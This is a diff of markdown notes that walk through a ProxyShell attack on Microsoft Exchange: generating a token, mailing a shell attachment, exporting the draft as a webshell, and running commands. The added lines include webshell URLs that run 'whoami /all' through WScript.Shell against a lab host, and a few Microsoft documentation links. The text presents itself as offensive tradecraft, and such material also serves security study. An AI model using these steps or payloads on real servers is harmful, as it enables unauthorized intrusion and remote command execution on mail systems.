@@ -146,29 +146,50 @@ then put the encoded webshell to <t:Content>...</t:Content> in chkproxyshell.go
 
 confirm proxyshell and get the sid value to generate token.
 
- - ![](pics/proxyshell12.png)
+ - ![](pics/proxyshell1.png)
 
 use the following py script to gen token value
 
- - ![](pics/proxyshell13.png)
+ - ![](pics/proxyshell2.png)
 
 confirm the token is valid
 
- - ![](pics/proxyshell14.png)
+ - ![](pics/proxyshell3.png)
 
-now use the token to send a email with shell attachment in, this may be saved as a draft in administrator's mailbox...
+now use the token to send a email with shell attachment in, this may be saved as a draft in test user's mailbox...
 
- - ![](pics/proxyshell15.png)
+ - ![](pics/proxyshell4.png)
 
- - ![](pics/proxyshell16.png)
+ - ![](pics/proxyshell5.png)
 
-finnaly use the following wsman python script to export The draft to webshell :)
+ - ![](pics/proxyshell6.png)
 
- - ![](pics/proxyshell17.png)
+finnaly use the following wsman python script to export The draft to webshell, sometimes may write shell failed, try one more time will be fine :)
 
- - ![](pics/proxyshell18.png)
+ - ![](pics/proxyshell7.png)
 
- - ![](pics/proxyshell19.png)
+ - ![](pics/proxyshell8.png)
+
+ - ![](pics/proxyshell9.png)
+
+access the shell and then execute the commands you want:
+
+``` bash
+view-source:https://192.168.186.130//aspnet_client/redhedh.aspx?cmd=Response.Write(Response.Write('eeeeeeeeeeeeeeeeeeee lUc1f3r11 is here!!!!'));
+```
+
+shell is just work fine!!!
+
+ - ![](pics/proxyshell10.png)
+
+command exec:
+
+``` bash
+view-source:https://192.168.186.130//aspnet_client/redhedh.aspx?cmd=Response.Write(new ActiveXObject("WScript.Shell").Exec("cmd.exe /c whoami /all").StdOut.ReadAll());
+```
+
+ - ![](pics/proxyshell11.png)
+ - ![](pics/proxyshell12.png)
 
 # ProxyToken
 ## ProxyToken part links
@@ -302,6 +323,8 @@ change DisableActivitySurrogateSelectorTypeCheck to True to overcome the limitat
  - [A tool to abuse Exchange services](https://github.com/sensepost/ruler)
  - [Attacking MS Exchange Web Interfaces](https://swarm.ptsecurity.com/attacking-ms-exchange-web-interfaces/)
  - [Exchange Server Protocol Documents](https://learn.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-oxprotlp/30c90a39-9adf-472b-8b5b-03c282304a83?source=recommendations)
+ - [Export items by using EWS in Exchange](https://learn.microsoft.com/en-us/exchange/client-developer/exchange-web-services/how-to-export-items-by-using-ews-in-exchange)
+ - [[MS-OXCFXICS]: Bulk Data Transfer Protocol](https://learn.microsoft.com/en-us/openspecs/exchange_server_protocols/ms-oxcfxics/b9752f3d-d50d-44b8-9e6b-608a117c8532)
 
 
 # Other Links
